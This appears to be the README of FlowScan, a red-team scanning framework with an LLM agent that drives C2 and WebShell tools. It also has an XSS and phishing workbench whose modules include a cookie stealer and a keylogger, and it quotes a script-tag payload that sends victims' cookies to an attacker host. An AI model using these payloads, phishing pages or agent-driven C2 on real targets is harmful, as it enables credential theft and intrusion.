# FlowScan

基于 Redis 事件总线的安全扫描编排框架。工具以 YAML 模块描述，事件经 Redis 流转，自动串联成「资产发现 → 端口扫描 → 服务指纹 → 漏洞探测」完整扫描链。内置 Web 控制面板（仪表盘 / 事件中心 / 资产情报 / AI 分析 / 命令 & 控制）、LLM 自动分析与 Agent 交互、xray 被动代理、C2 与 WebShell 管理、XSS 反连与钓鱼页面工作台。
## 界面展示
<img width="2360" height="1247" alt="屏幕截图 2026-08-17 015302" src="https://github.com/user-attachments/assets/81dedffe-4011-4dc7-a950-092f8aab7f72" />
<img width="2527" height="1363" alt="屏幕截图 2026-08-17 015330" src="https://github.com/user-attachments/assets/0afa749f-0aa1-4eae-a05f-44688e4a73b3" />
<img width="2514" height="1372" alt="屏幕截图 2026-08-17 015426" src="https://github.com/user-attachments/assets/7c38f926-7ad2-4f3b-935e-33987202645a" />
<img width="2553" height="1391" alt="屏幕截图 2026-08-17 015603" src="https://github.com/user-attachments/assets/dea90b9c-7844-40d5-a04e-3fd07ff46055" />
<img width="2527" height="1365" alt="屏幕截图 2026-08-17 015501" src="https://github.com/user-attachments/assets/b3359a3e-a486-4271-9c2f-95719f18329c" />
<img width="2528" height="1361" alt="屏幕截图 2026-08-17 015449" src="https://github.com/user-attachments/assets/2b5a1d8a-be24-4975-83a2-21ae950edb2c" />
<img width="2530" height="1354" alt="屏幕截图 2026-08-17 015439" src="https://github.com/user-attachments/assets/c1f9fd08-911d-40c9-825b-d7e060f61c60" />

## 核心特性

- **事件驱动编排**：所有工具通过 Redis 交换事件（Lua 原子入队 / 认领 / 去重），多 Worker 节点并行消费，自动形成扫描链
- **28 个扫描模块**：子域枚举（subfinder / amass / ksubdomain / crtsh / wayback）、DNS 解析与反查、ASN 归属、端口扫描（naabu）、HTTP 探活指纹（httpx）、CMS 指纹（whatweb / nmap）、目录爆破（feroxbuster / arjun）、爬虫（katana）、漏洞扫描（nuclei / afrog / medusa）、FOFA 资产测绘、截图 / 图标采集、403 绕过等
- **失败重试与看门狗**：命令失败的事件不标记完成，本节点按（工具，事件）粒度指数退避后重试，其他节点可随时抢占；任务锁靠心跳看门狗释放，持有节点宕机超过阈值（默认 120s）后自动接管
- **双轨黑名单 + 白名单**：文件规则（`black_list.cfg`）+ Redis 动态规则，4 种匹配模式（正则包含 / 后缀 / 前缀 / IP 范围），入队即拦截；白名单非空时仅放行命中事件
- **AI 分析**：LLM 对事件日志自动分析并产出动作（新增 / 删除 / 拉黑 / 记录），支持 dry-run 预览、一键执行、定时任务调度、思考强度（reasoning_effort）配置
- **Agent 模式**：内置 ReAct 循环 + 40 个工具（事件操作 / C2 / WebShell / HTTP / 浏览器自动化 / 沙箱命令 / MCP / 技能库），危险操作按 auto / AI 审批 / 人工审批三档管控，全程审计，收工自动生成结构化报告
- **MCP 接入**：SSE / HTTP / stdio 三种传输，连接与工具列表缓存、schema 精简，Agent 可直接调用外部 MCP 工具
- **技能库（Skills）**：AI 面板可视化配置，全文加载 / 渐进式索引两种模式，Agent 可按需 `load_skill` / `search_skills`
- **命令 & 控制**：内嵌 pyexec-c2 服务端（Beacon 管理、模块下发、伪终端、通道配置、审计、部署向导）+ WebShell 连接管理（执行 / 文件操作 / 多编码解码 / 命令历史）
- **XSS 反连与钓鱼页面**：模块化 JS 反连（16 个内置模块）+ 静态钓鱼页面工作台，受害者回传记录落库
- **xray 被动代理**：内嵌于容器，报告自动接入 Web 面板（`/xray-report`）
- **Docker 化部署**：主节点单容器（redis + web + xray 内嵌）+ 独立 worker 容器，工具链由镜像统一安装，模块 YAML 无需任何安装步骤

## 架构

```
                 ┌────────────────────────────┐
  Web 面板注入 ──▶│        Redis 事件总线        │
  (仪表盘/事件)    │  fs3:event:* 事件库          │
                 │  fs3:pending:<tool> 任务队列  │
                 │  fs3:lock / done / 血缘索引   │
                 └────────────┬───────────────┘
                              │ 轮询 + Lua 原子认领
                 ┌────────────▼───────────────┐
                 │  Worker 节点（可多台并行）      │
                 │  claim → transform → exec    │
                 │  → parse → push_event        │
                 └────────────┬───────────────┘
                              │ 产出子事件回流
                              ▼
              自动触发下一层模块（资产→端口→指纹→漏洞）
```

事件生命周期：`push_event`（黑名单 / 白名单拦截 → 指纹去重 → 落库 + 时间索引 + 血缘 → 消费工具入队）→ worker `claim_task`（Lua 原子锁，看门狗心跳保活）→ `pipeline.process`（transform 参数化 → 执行命令 → 解析输出 → 发布子事件）→ 失败不标记完成，指数退避重试。

## 快速开始（Docker）

### 依赖

- Docker 20.10+，compose v2 插件
- 可访问 Docker Hub（拉取 `kalilinux/kali-rolling` 基础镜像）

### 启动主节点（单容器：redis + web + xray）

```bash
cd FlowScan
bash docker/up.sh --build        # 首次构建镜像；已有镜像可直接 bash docker/up.sh
```

- Web 控制面板：http://127.0.0.1:65000（登录账号密码见 `config.yaml` 的 `web_config`）
- **端口排布（65000-65535 段整体映射）**：web=65000 / redis=65001 / xray=65002 / c2 implant=65003 / c2 client=65004 / xss+钓鱼页面=65005
- **端口完全配置驱动**：改 `config.yaml` 的 `web_config.port` / `redis.redis_port` / `xray_listen_http_proxy`、`c2` 段的 `server_port` / `client_port`、`phishing` 段的 `port` 后重跑 `bash docker/up.sh`，段内端口自动生效
- 每次 `bash docker/up.sh` 会**随机化** `config.yaml` 中的 redis 密码 / web 登录密码 / secret_key（容器重启不变；`--no-randomize` 跳过），密码以 `config.yaml` 为准（宿主与容器同一挂载文件）；同机 worker 的密码由 up.sh 自动同步
- 日志：`docker logs -f flowscan-main`

> 主节点不创建自定义 docker 网络：web 容器内 `redis_host: 127.0.0.1` 直连同容器内嵌 redis；worker 等外部连接一律走宿主端口映射。

### 启动 Worker 节点

```bash
# 部署前准备 worker 配置（redis_host 填主节点地址）
cp config.worker.yaml.example config.worker.yaml
vim config.worker.yaml    # redis.redis_host 改为主节点 IP；password 可留空（up_worker.sh 自动同步）

# 启动（与主节点 up.sh 对称：自动同步主节点 redis 密码 → 启动）
bash docker/up_worker.sh            # 镜像已构建时
bash docker/up_worker.sh --build    # 首次部署：构建镜像 + 启动
# 跨机部署（worker 机器上无主节点 config.yaml）：手动填 config.worker.yaml 的 redis.password 后 bash docker/up_worker.sh
```

- worker 容器**不装 redis**，连接主节点 redis 全部经宿主端口映射
- **密码同步**：主节点 `bash docker/up.sh` 随机化密钥后自动把新 redis 密码写入 config.worker.yaml（worker 每 10s 重读 config 自动重连，无需重启）；也可手动执行 `bash docker/sync_worker_pass.sh`
- worker 镜像内置全部 28 个模块工具链，启动时按 `install/*.sh` 幂等补装
- 日志：`docker logs -f flowscan-worker`

### 镜像构建

| 镜像 | 文件 | 内容 | 用途 |
|---|---|---|---|
| `flowscan:main` | `Dockerfile` | Kali + web 依赖 + chromium（Agent 浏览器）+ xray | 主节点（redis + web + xray 内嵌） |
| `flowscan:worker` | `Dockerfile.worker` | Kali + 28 模块工具链全量 | worker 扫描节点 |

两个镜像共用 `kalilinux/kali-rolling` 基础镜像，apt 源统一替换为清华镜像。一键构建 + 验证：`sudo bash docker/verify_docker.sh`。

### 本机开发（非容器）

```bash
# 需要本机有 redis（密码与 config.yaml 一致），改临时配置后直接跑
python3 -m venv .venv && . .venv/bin/activate
pip install PyYAML redis flask tldextract requests httpx beautifulsoup4 browser-use
cp config.yaml /tmp/config-web.yaml   # 按需修改 redis 地址 / 端口
python3 main.py web --config /tmp/config-web.yaml --host 0.0.0.0 --port 8081
```

## 配置说明（config.yaml）

| 段 | 说明 |
|---|---|
| `redis` | `redis_host` / `redis_port` / `password` / `db`。worker 与 web 统一从这里读连接信息 |
| `web_config` | web 面板监听地址 / 端口、登录用户名 / 密码、session 密钥与有效期 |
| `worker` | 扫描批大小、本地最大并发、心跳间隔、锁失联阈值（`lock_stale_seconds`）、失败重试退避（`retry_base_seconds` / `retry_cap_seconds`） |
| `xray_listen_http_proxy` / `xray_remote_http_proxy` | xray 被动代理监听地址与上游代理 |
| `fofa` | FOFA API key 与 base_url |
| `ai_analysis` | LLM 配置（base_url / api_key / model / timeout / max_events / log_api_key）+ 定时任务参数 + Agent 参数（迭代上限 / 扫描间隔 / 审批模式 / 上下文预算 / 思考强度） |
| `c2` | 内嵌 C2 服务开关、项目根目录（`c2_server`）与监听端口覆盖 |
| `phishing` | 钓鱼页面服务开关、项目根目录（`phishing_server`）与端口覆盖 |
| `mcp` | MCP server 列表（name / type / url / command / enabled） |
| `skills` | 技能库启用开关与目录列表（指向分类级目录） |

## Web 控制面板

导航结构：

- **仪表盘**：事件统计、节点 / 工具状态、队列积压预警（8s 自动刷新）、24h 事件趋势与类型分布图表
- **事件中心**
  - 事件查询：按类型 / 时间分页浏览、搜索（未选类型搜最近 1000 条，选中类型搜该类型最近 5000 条）、事件路径与递归子事件查询
  - 事件图谱：事件血缘树可视化（vis.js），点击展开、搜索、查看递归后代
  - 事件管理：批量注入（`[类型]值` 或纯值）、删除（支持纯值全类型匹配）、清空、全量状态导出 / 恢复 JSON、文件 / Redis 黑名单管理 + 白名单管理（实时测试）
- **资产情报**
  - 资产截图：chromium 对 URL 截图（SCREENSHOT 事件），favicon 图标采集（ICON 事件）分栏展示
  - Xray 报告：被动代理发现列表（severity 分级），iframe 嵌入原始 HTML 报告
- **AI 分析**（4 个 tab）
  - Agent 实时交互：自建 ReAct 循环，40 个工具，会话历史 + 实时轨迹，危险操作审批（auto / AI 审批 / 人工审批），注入后自动拉取新事件喂回，收工自动生成报告
  - 定时任务模式：按分钟周期对指定事件类型自动分析，动作开关控制自动执行范围，任务 / 运行历史管理
  - 事件日记：AI 分析日志 + 扫描事件总览 + API 调用示例
  - AI 配置：LLM 参数（含思考强度）、MCP 服务器管理（添加 / 验证 / 删除）、技能库滑块配置（全文加载 / 渐进式加载）
- **命令 & 控制**（4 个 tab）
  - C2 工作台：内嵌 pyexec-c2 服务端——Beacon 列表、伪终端（`use <id>` 切换，结果自动回显）、模块管理 / 下发、通道配置、部署向导、审计日志、自动执行列表、批量命令
  - WebShell 管理：连接 CRUD（密码脱敏）、执行命令（auto / UTF-8 / GBK 解码）、文件操作（读 / 写 / 删 / 重命名 / 建目录 / 上传下载）、命令历史、一句话木马模板库
  - XSS 管理：JS 反连模块构建与受害浏览器回传记录
  - 钓鱼页面：静态钓鱼页面模块管理（每页面一个文件夹，可设定当前展示页面），访问记录与操作日志
- **调试工具**
  - 执行流程：vis.js 事件流向图（工具 × 事件，含未消费事件告警）
  - 模板测试：模块 YAML 在线编辑与六步测试（校验 / 安装 / transform / 命令渲染 / 执行 / 解析）
  - 执行日志 / 节点 & 工具 / Redis 命令

## 事件类型

| 类型 | 含义 |
|---|---|
| `INPUT` | 任意输入文本（URL / 域名 / IP 混合），由 input 模块解析 |
| `DNS_NAME` | 域名（含子域名） |
| `IP_ADDRESS` / `IP_RANGE` | IPv4 地址 / CIDR 网段 |
| `URL` / `URL_UNVERIFIED` | 已验证 / 未验证存活的 URL |
| `ICON_PATH` | favicon 图标 URL |
| `HOST_TCP_PORT_OPEN` | `ip -> [port,...]` 端口扫描结果 |
| `OPEN_TCP_PORT` | `ip:port` 单个端口 |
| `FINDING` / `TECHNOLOGY` / `WAF` / `VULNERABILITY` / `SERVICE` | 指纹与漏洞发现 |
| `SCREENSHOT` / `ICON` | 截图 / 图标资产（value 为 JSON，含 url / path） |
| `403_URL` | 目录爆破产出的 403 路径（供 403 绕过模块消费） |

## 模块清单（28 个）

按流水线分层：

| 层 | 模块 | 输入 → 输出 |
|---|---|---|
| L0 输入 | `input` | INPUT → DNS_NAME / IP_ADDRESS / IP_RANGE / URL / URL_UNVERIFIED / ICON_PATH |
| L1 资产扩展 | `subfinder` / `amass` / `ksubdomain` | DNS_NAME → DNS_NAME（子域枚举） |
| | `crtsh` | DNS_NAME → DNS_NAME（证书透明度） |
| | `wayback` | DNS_NAME → URL（历史 URL） |
| | `whois` / `reverse_whois` | DNS_NAME → 注册信息 / 反查 |
| | `permute` | DNS_NAME → DNS_NAME（子域排列） |
| | `asn` | DNS_NAME → IP_RANGE（ASN 归属） |
| | `fofa` | DNS_NAME / URL / IP / ICON_PATH → 资产测绘 |
| L2 解析 | `ip_resolve` | DNS_NAME → IP_ADDRESS（dnsx + cdncheck 去 CDN） |
| | `ptr` | IP_ADDRESS → DNS_NAME（反查） |
| | `ip_range_split` | IP_RANGE → IP_ADDRESS（CIDR 展开） |
| L3 存活 | `naabu` | IP_ADDRESS / IP_RANGE → HOST_TCP_PORT_OPEN（端口扫描） |
| | `ip_port_split` | HOST_TCP_PORT_OPEN → OPEN_TCP_PORT（拆单端口） |
| L4 指纹 | `httpx` | URL / OPEN_TCP_PORT → 探活 / 指纹 / ICON_PATH |
| | `whatweb` | URL → TECHNOLOGY（CMS 指纹） |
| | `nmap` | HOST_TCP_PORT_OPEN → FINDING（服务 / OS 深度指纹） |
| | `icon` | ICON_PATH → ICON（favicon 下载） |
| L5 深挖 | `feroxbuster` | URL → URL / 403_URL（目录爆破） |
| | `katana` | URL → FINDING（爬虫，JS 渲染） |
| | `screenshot` | URL → SCREENSHOT（chromium 截图） |
| | `403bypass` | 403_URL → URL / FINDING（绕过尝试） |
| | `arjun` | URL → FINDING（HTTP 参数发现） |
| L6 漏洞 | `nuclei` / `afrog` | URL → VULNERABILITY |
| | `medusa` | OPEN_TCP_PORT → FINDING（弱口令爆破） |

典型链路：`INPUT → input → DNS_NAME → subfinder / ip_resolve → IP_ADDRESS → naabu → HOST_TCP_PORT_OPEN → ip_port_split → OPEN_TCP_PORT → httpx → URL → nuclei / afrog / feroxbuster / katana → VULNERABILITY / FINDING`

## 扩展新模块

三步即可接入流水线：

1. **写脚本** `bin/<tool>.py`（可选）：优先纯标准库；stdout 每行一个 JSON `{事件类型: 值}`；进度写 stderr
2. **写定义** `modules/<name>.yaml`（无 check / install 块，工具由镜像统一安装）：

```yaml
name: my_tool
description: 工具描述
runtime:
  max_concurrency: 2
allowed_output_events:
- VULNERABILITY
io_contract:
  input_events:
  - URL
  input_transform_code: |
    import shlex
    value = data["value"].strip()
    return [{"target": value, "target_q": shlex.quote(value)}]
execution:
  command: mytool -u {{target_q}} -json 2>/dev/null
  output_parse_code: |
    import json
    results = []
    for line in data["stdout"].splitlines():
        item = json.loads(line)
        results.append({"VULNERABILITY": json.dumps(item)})
    return results
```

3. **写安装脚本** `install/<name>.sh`（与 YAML 同名，幂等，镜像构建与 worker 启动时复用；优先 apt，GitHub release 走多镜像链回退）

> 约定：transform / parse 代码运行在受限沙箱（仅白名单 import，无 Exception 类，`except` 用裸 `except:`）；命令模板中的用户输入必须 `shlex.quote()` 转义；消费新事件类型前先确认已有产出者（避免造重复类型）。

## 钓鱼页面（命令 & 控制 → XSS 管理 / 钓鱼页面）

XSS 反连 + 钓鱼页面一体工作台，源码在 `phishing_server/`（与 `c2_server/` 平行）。

**JS 反连模块**（`phishing_server/js_modules/`）：每模块一个 .js，文件头 `// MODULE = {"desc": "...", "params": [["参数", "默认"]]}` 元数据，模块体可用内建 `SERVER` / `report(data)` / `_q(name, 默认)`，`{{参数}}` 占位符在构建时渲染。内置 16 个：hello（探测回传）/ cookie_stealer / keylogger / click_logger / screen / clipboard_theft / form_grabber / fingerprint / history_sniff / page_source / redirect / webrtc_ip / persist / pretty_theft / xss_payload / custom（自定义）。

**静态页面模块**（`phishing_server/pages/`）：每页面一个文件夹（index.html + style.css + app.js + meta.json），`{{host}}` / `{{port}}` 占位符自动替换。面板可"设为当前页面"，访问 `http://host:port/` 即展示当前页面，`/page/<名称>` 访问指定页面，页面内资源走 `/pages/<名称>/<文件>`（防路径穿越）。内置 login（仿登录页，提交回传）/ verify / error 等。

**JS 分发服务器**：端口由 config.yaml `phishing.port` 配置（默认 65005），`/payload.js?m=模块&a=JSON参数` 实时构建返回 JS（浏览器下载即执行），`/report` 接收回传（Image beacon 跨域，落 Redis `fs3:phishing:report:*`）。

**XSS 注入闭环**：构建 `xss_payload` 模块 → 得到 `<script src="http://HOST:PORT/payload.js?m=cookie_stealer"></script>` → 粘贴进目标站 XSS 注入点 → 受害者浏览器加载脚本并执行 → 回传数据在面板"受害记录"可见。页面内也可直接内嵌 `<script src="/payload.js?m=hello">` 把钓鱼页与反连 JS 结合。

config.yaml 启用：

```yaml
phishing:
  enabled: true
  project_root: phishing_server
  config_file: config.json
  port: 65005
```

> ⚠️ 仅用于授权测试。JS / 页面无沙箱，模块代码即受害者浏览器执行的任意代码。

## 目录结构

```
FlowScan/
├── main.py                    # 入口（worker / status / web 三模式）
├── config.yaml                # 主配置（挂载给容器）
├── config.yaml.example        # 配置模板
├── config.worker.yaml.example # worker 节点配置模板
├── black_list.cfg             # 文件黑名单
├── docker-compose.yml         # 主节点编排（单容器 redis+web+xray）
├── docker-compose.worker.yml  # worker 节点编排
├── Dockerfile / Dockerfile.worker
├── docker/                    # entrypoint.sh（密钥随机化 / 内嵌 redis+xray）、up.sh / up_worker.sh 等
├── modules/                   # 28 个工具 YAML 定义（无 check / install 块）
├── install/                   # 工具安装脚本（与模块同名，幂等）
├── flowscan/                  # 核心引擎
│   ├── worker.py              # Worker 主循环 + 线程池 + 失败退避 + 看门狗
│   ├── pipeline.py            # transform → exec → parse → publish
│   ├── redis_store.py         # Redis 数据层（Lua 原子 claim / push、索引、血缘）
│   ├── filter.py              # 黑名单 / 白名单引擎（文件 + Redis 双轨）
│   ├── llm.py                 # 统一 LLM 调用核心（重试 / 思考强度 / 溢出检测）
│   ├── code_runner.py         # 受限沙箱 exec
│   ├── tool_module.py         # YAML → ToolModule
│   ├── mcp_client.py / mcp_verify.py   # MCP 客户端与配置验证
│   ├── c2_bridge.py           # pyexec-c2 桥接
│   ├── webshell.py            # WebShell 代理
│   └── phishing_bridge.py     # 钓鱼服务桥接
├── web_app/                   # Web 控制面板（Flask 应用工厂 + 功能子模块）
├── c2_server/                 # 内嵌 pyexec-c2 服务端（implant / modules / s_modules）
├── phishing_server/           # XSS 反连模块 + 静态钓鱼页面
├── webshell_templates/        # WebShell 一句话木马模板库
├── bin/                       # 配套脚本（input / httpx / fofa / permute 等 + xray 配置）
├── prompts/                   # AI system prompt
├── skills/                    # 技能库目录（AI 分析 / Agent 加载）
├── tools/                     # randomize_secrets.py 等辅助脚本
├── wordlists/                 # 字典
├── state_snapshots/           # 状态快照导出目录（挂载持久化）
└── reports/                   # xray 报告、截图、图标（挂载持久化）
```

## 故障排查

- **注入事件后无产出**：`docker exec flowscan-main redis-cli -a <密码> hlen fs3:tools` —— 注册表为空则重启 worker（心跳每 10s 幂等自愈重建）；再查 `zcard fs3:pending:<tool>` 与 `docker logs flowscan-worker | grep exit=`
- **worker 日志 exit=127**：容器缺命令 / 解释器，检查工具是否装入（`docker exec flowscan-worker command -v <tool>`）
- **xray 报告空白**：被动模式需 HTTPS CONNECT 隧道流量（`curl -k -x http://127.0.0.1:7777 https://靶场`）；报告文件权限异常时 web 读不了（start_xray.sh 内已自动轮询 chmod）；报告不覆盖已存在文件（脚本已预清理）
- **改代码后 worker 不生效**：worker 容器只挂载 config.yaml，代码在镜像内——修改后需 `docker cp` 进容器（`flowscan/` 整目录 + `main.py`）或重建镜像
- **容器重启丢失数据**：内嵌 redis 为纯内存（无持久化），重启后事件库清空；需要持久化时开启 AOF 并挂载 data 卷
- **`docker restart` 丢端口映射**：用 `docker stop` + `docker start` 代替 restart
- **构建失败**：apt 源已固定清华镜像；GitHub release 下载慢可重试（多镜像自动回退）
- **容器内时区为 UTC**：日志时间比宿主晚 8 小时

## 安全注意事项

- **授权范围**：仅扫描有明确授权的目标，遵守当地法律法规
- **命令注入面**：模块 transform 必须 `shlex.quote()` 转义用户输入；沙箱 import 白名单受限
- **凭据**：容器每次启动随机化 redis / web 密码；config.yaml 含 API key 时注意文件权限与镜像构建上下文（`.dockerignore` 已排除敏感文件）
- **ksubdomain**：无状态发包需要 `NET_RAW` 能力（compose 已配置）；nmap -O 需 root（容器默认 root）
- **C2 / WebShell / 钓鱼**：高危操作在面板内有二次确认，Agent 调用受审批模式管控并全量审计；JS 反连与钓鱼页面仅用于授权测试

## 免责声明

本工具仅供授权的安全评估、渗透测试与防御研究使用。使用者须确保拥有目标系统的合法授权，并自行承担扫描产生的网络流量、系统负载与法律后果。作者不对任何未经授权的使用或滥用承担责任。
